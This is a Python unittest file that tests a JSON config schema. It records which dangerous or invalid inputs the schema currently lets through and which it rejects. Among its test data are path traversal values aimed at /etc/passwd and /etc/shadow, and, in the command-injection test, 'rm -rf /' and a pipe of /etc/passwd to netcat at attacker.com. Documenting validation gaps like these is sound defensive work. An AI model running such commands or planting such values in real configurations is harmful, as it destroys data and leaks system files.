import json
import os
import unittest
import jsonschema


class TestConfigSchemaAdversarial(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        schema_path = os.path.join(
            os.path.dirname(__file__), "..", "templates", "config.schema.json"
        )
        with open(schema_path, "r", encoding="utf-8") as f:
            cls.schema = json.load(f)
        cls.validator = jsonschema.Draft7Validator(cls.schema)

    def validate(self, config):
        """Helper to run validator and return list of errors."""
        return list(self.validator.iter_errors(config))

    def test_valid_minimal_config(self):
        config = {
            "version": "2.0.0",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
        }
        errors = self.validate(config)
        self.assertEqual(len(errors), 0, f"Valid config failed validation: {errors}")

    def test_valid_full_config(self):
        config = {
            "version": "2.0.0",
            "project": {
                "name": "my-project",
                "stage": "code",
                "type": "cli",
            },
            "continuity": {
                "enabled": True,
                "vault_path": "/path/to/vault",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
                "push": True,
                "obsidian_enabled": False,
            },
            "release": {
                "version_files": [
                    {"path": "package.json", "field": "version"},
                    {"path": "Cargo.toml", "field": "package.version"},
                ],
                "build_command": "npm run build",
                "test_command": "npm test",
                "artifact_dir": "dist",
            },
            "audit": {
                "deployment_context": "internet-facing",
            },
        }
        errors = self.validate(config)
        self.assertEqual(len(errors), 0, f"Valid full config failed validation: {errors}")

    # =========================================================================
    # GAP / EDGE CASE TESTS: Schema currently PERMITS dangerous or invalid data
    # =========================================================================

    def test_gap_path_traversal_permitted(self):
        """Schema allows path traversal strings in vault_path, handoff_file, etc."""
        config = {
            "version": "2.0.0",
            "continuity": {
                "vault_path": "../../../../../etc",
                "handoff_file": "../../../passwd",
                "delta_file": "../../shadow",
            },
            "release": {
                "artifact_dir": "../../../var/www",
                "version_files": [{"path": "../../etc/shadow", "field": "version"}],
            },
        }
        errors = self.validate(config)
        # Schema currently allows path traversal (0 errors)
        self.assertEqual(
            len(errors),
            0,
            "Path traversal inputs should be documented as allowed by schema gap",
        )

    def test_gap_unbounded_array_permitted(self):
        """Schema permits huge arrays in version_files (no maxItems)."""
        config = {
            "version": "2.0.0",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
            "release": {
                "version_files": [
                    {"path": f"file_{i}.json", "field": "version"} for i in range(1000)
                ]
            },
        }
        errors = self.validate(config)
        self.assertEqual(
            len(errors), 0, "Unbounded arrays currently allowed by schema gap"
        )

    def test_gap_duplicate_version_files_permitted(self):
        """Schema permits duplicate items in version_files (no uniqueItems)."""
        config = {
            "version": "2.0.0",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
            "release": {
                "version_files": [
                    {"path": "package.json", "field": "version"},
                    {"path": "package.json", "field": "version"},
                ]
            },
        }
        errors = self.validate(config)
        self.assertEqual(
            len(errors), 0, "Duplicate items currently allowed by schema gap"
        )

    def test_gap_additional_properties_permitted(self):
        """Schema permits arbitrary unknown keys everywhere (no additionalProperties: false)."""
        config = {
            "version": "2.0.0",
            "unknown_top_level": "malicious_injection",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
                "unknown_continuity_key": 12345,
            },
            "project": {
                "name": "test",
                "unknown_project_key": True,
            },
            "release": {
                "unknown_release_key": ["a", "b"],
                "version_files": [
                    {
                        "path": "file.json",
                        "field": "version",
                        "unknown_item_key": "injected",
                    }
                ],
            },
            "audit": {
                "unknown_audit_key": {},
            },
        }
        errors = self.validate(config)
        self.assertEqual(
            len(errors), 0, "Additional properties currently allowed by schema gap"
        )

    def test_gap_empty_strings_permitted(self):
        """Schema permits empty strings for critical fields (no minLength: 1)."""
        config = {
            "version": "",
            "project": {
                "name": "",
                "type": "",
            },
            "continuity": {
                "vault_path": "",
                "handoff_file": "",
                "delta_file": "",
            },
            "release": {
                "build_command": "",
                "test_command": "",
                "artifact_dir": "",
                "version_files": [{"path": "", "field": ""}],
            },
        }
        errors = self.validate(config)
        self.assertEqual(
            len(errors), 0, "Empty strings currently allowed by schema gap"
        )

    def test_gap_command_injection_strings_permitted(self):
        """Schema permits arbitrary shell payload in build_command and test_command."""
        config = {
            "version": "1.0.0",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
            "release": {
                "build_command": "rm -rf / # && curl http://malicious.com",
                "test_command": "cat /etc/passwd | nc attacker.com 4444",
            },
        }
        errors = self.validate(config)
        self.assertEqual(
            len(errors), 0, "Arbitrary shell injection strings currently allowed"
        )

    # =========================================================================
    # REJECTION TESTS: Schema correctly REJECTS invalid types / missing fields
    # =========================================================================

    def test_rejection_missing_required_version(self):
        config = {
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            }
        }
        errors = self.validate(config)
        self.assertTrue(any(list(e.path) == [] and "version" in e.message for e in errors))

    def test_rejection_missing_required_continuity(self):
        config = {"version": "1.0.0"}
        errors = self.validate(config)
        self.assertTrue(
            any(list(e.path) == [] and "continuity" in e.message for e in errors)
        )

    def test_rejection_missing_continuity_fields(self):
        config = {
            "version": "1.0.0",
            "continuity": {
                "vault_path": ".",
            },
        }
        errors = self.validate(config)
        error_msgs = [e.message for e in errors]
        self.assertTrue(any("handoff_file" in msg for msg in error_msgs))
        self.assertTrue(any("delta_file" in msg for msg in error_msgs))

    def test_rejection_invalid_enum_project_stage(self):
        config = {
            "version": "1.0.0",
            "project": {"stage": "invalid_stage"},
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
        }
        errors = self.validate(config)
        self.assertTrue(
            any("invalid_stage" in e.message or "stage" in str(e.path) for e in errors)
        )

    def test_rejection_invalid_enum_audit_deployment_context(self):
        config = {
            "version": "1.0.0",
            "continuity": {
                "vault_path": ".",
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
            },
            "audit": {"deployment_context": "public-cloud"},
        }
        errors = self.validate(config)
        self.assertTrue(
            any(
                "public-cloud" in e.message or "deployment_context" in str(e.path)
                for e in errors
            )
        )

    def test_rejection_invalid_types(self):
        config = {
            "version": 123,  # Should be string
            "project": "not an object",  # Should be object
            "continuity": {
                "vault_path": True,  # Should be string
                "handoff_file": "HANDOFF.md",
                "delta_file": "DELTA_TRACKING.md",
                "enabled": "yes",  # Should be boolean
            },
            "release": {
                "version_files": "not an array",  # Should be array
            },
        }
        errors = self.validate(config)
        self.assertGreaterEqual(len(errors), 4)


if __name__ == "__main__":
    unittest.main()
